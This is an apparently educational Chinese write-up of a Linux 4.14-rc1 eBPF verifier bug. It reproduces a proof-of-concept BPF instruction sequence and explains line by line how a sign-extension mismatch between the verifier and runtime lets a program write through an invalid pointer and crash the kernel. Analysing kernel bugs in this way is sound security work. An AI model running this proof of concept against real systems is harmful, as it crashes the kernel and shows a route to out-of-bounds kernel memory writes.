# 环境

内核:v4.14-rc1

# 分析
主要代码(参考质料1中代码):
```c
(1 )        BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),

        // fill r0 with pointer to map value
(2 )        BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),
(3 )        BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack
(4 )        BPF_MOV32_IMM(BPF_REG_ARG2, 1),
(5 )        BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),
(6 )        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_TMP),
(7 )        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
(8 )        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
(9 )        BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit
(10)        BPF_EXIT_INSN(), // exit

        // r1 = 0xffff'ffff, mistreated as 0xffff'ffff'ffff'ffff
(11)        BPF_MOV32_IMM(BPF_REG_1, 0xffffffff),
        // r1 = 0x1'0000'0000, mistreated as 0
(12)        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),
        // r1 = 0x1000'0000'0000'0000, mistreated as 0
(13)        BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 28),

        // compute noncanonical pointer
(14)        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),

        // crash by writing to noncanonical pointer
(15)        BPF_MOV32_IMM(BPF_REG_1, 0xdeadbeef),
(16)        BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, 0),

        // terminate to make the verifier happy
(17)        BPF_MOV32_IMM(BPF_REG_0, 0),
(18)        BPF_EXIT_INSN()
```

要理清这段代码的为什么要造成崩溃，需要理解bpf程序的执行流程(参考资料2)

![image](https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/image005.png)

用户提交bpf代码时，进行一次验证(==模拟代码执行==)，而在执行的时候并不验证。


而漏洞形成的原因在于：模拟执行代码（验证的过程中）与正真执行时的差异造成的。

从两个层面分析，就容易发现问题了(重点代码分析)

#### 模拟执行（验证过程）分析(寄存器用uint64_t、立即数用int32_t表示(分析可以发现)）

(11) 行 : 将 0xffff`ffff放入BPF_REG_1寄存器中(分析代码发现进行了符号扩展 BPF_REG_1 为 0xffff`ffff`ffff`ffff)

(12) 行 ：BPF_REG_1 = BPF_REG_1 + 1,此时由于寄存器溢出，只保留低64位（寄存器大小为64位），所以 BPF_REG_1变为0


(13) 行 : 左移，BPF_REG_1还是0

(14) 行 : 将BPF_REG_0 （map value 的地址）加 BPR_REG_1 ,BPF_REG_0，保持不变(该操作能绕过接下来的地址检查操作)

(15)、(16): 将 map value 的值改为 0xdeadbeef。（赋值时会检查 map value 地址的合法性,我们从上面分析可以得出，map value地址合法）

验证器（模拟执行）该bpf 代码，发现没什么问题，允许加载进内核

#### 真正执行（bpf虚拟机）分析(寄存器用uint64_t，立即数用int32_t表示)

(11)行 : 将 0xffff`ffff（立即数转换为uint32_t） 放入 BPF_REG_1 的低32 位

(12)行 ： BPF_REG_1 = BPF_REG_1 + 1 ，此时 BPF_REG_1 = 0x1`0000`0000(再次提示：运行时 寄存器用 uint64_t表示)

(13)行 : 左移，BPF_REG_1 = 0x1000'0000'0000'0000

(14)行 : 将BPF_REG_0 （map value 的地址）加 BPR_REG_1 ,此时BPF_REG_0变成一个非法值

(15)、(16): 导致非法内存访问，崩溃！

这就是导致崩溃的原因

# 参考资料
1.POC地址:https://bugs.chromium.org/p/project-zero/issues/detail?id=1454&desc=3

2.eBPF简史:https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html
    
